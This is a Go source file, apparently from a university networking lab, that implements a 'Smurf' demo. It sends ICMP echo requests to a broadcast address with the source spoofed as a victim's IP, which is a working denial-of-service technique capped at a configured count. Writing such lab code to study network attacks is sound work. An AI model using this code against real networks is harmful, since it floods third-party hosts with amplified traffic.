package usecase

import (
	"fmt"
	"net"
	"time"

	"NSSaDS/lab5/internal/domain"
	"NSSaDS/lab5/internal/infrastructure/icmp"
	"NSSaDS/lab5/pkg/config"
)

type Smurfer struct {
	cfg *config.Config
	out domain.Printer
}

func NewSmurfer(cfg *config.Config, out domain.Printer) *Smurfer {
	return &Smurfer{cfg: cfg, out: out}
}

func ClampSmurfCount(n, def, max int) int {
	if n <= 0 {
		return def
	}
	if n > max {
		return max
	}
	return n
}

func (s *Smurfer) Run(victimHost, bcastHost string, count int) error {
	victim, err := ResolveIPv4(victimHost)
	if err != nil {
		return fmt.Errorf("victim: %w", err)
	}
	bcast, err := ResolveIPv4(bcastHost)
	if err != nil {
		return fmt.Errorf("broadcast: %w", err)
	}
	count = ClampSmurfCount(count, s.cfg.SmurfCount, s.cfg.SmurfMax)

	sock, err := icmp.OpenRawIP()
	if err != nil {
		return fmt.Errorf("open raw ip: %w", err)
	}
	defer sock.Close()

	s.printBanner(victim, bcast, count)
	return s.sendAll(sock, victim, bcast, count)
}

func (s *Smurfer) printBanner(victim, bcast net.IP, count int) {
	s.out.Printf("lab smurf demo: %d echo request(s)\n", count)
	s.out.Printf("  dest (broadcast): %s\n", bcast)
	s.out.Printf("  spoofed source (victim): %s\n", victim)
	s.out.Printf("wireshark on victim: icmp && ip.dst == %s\n", victim)
}

func (s *Smurfer) sendAll(sock domain.RawIPSocket, victim, bcast net.IP, count int) error {
	for seq := 1; seq <= count; seq++ {
		if err := s.sendOne(sock, victim, bcast, seq); err != nil {
			return err
		}
		s.out.Printf("sent spoofed echo seq=%d\n", seq)
	}
	return nil
}

func (s *Smurfer) sendOne(sock domain.RawIPSocket, victim, bcast net.IP, seq int) error {
	payload, err := icmp.BuildEchoRequest(WorkerID(0), seq, time.Now(), s.cfg.PayloadSize)
	if err != nil {
		return fmt.Errorf("build echo: %w", err)
	}
	packet, err := icmp.BuildIPv4(victim, bcast, payload, s.cfg.DefaultTTL)
	if err != nil {
		return fmt.Errorf("build ipv4: %w", err)
	}
	if err := sock.SendIP(bcast, packet); err != nil {
		return fmt.Errorf("send: %w", err)
	}
	return nil
}
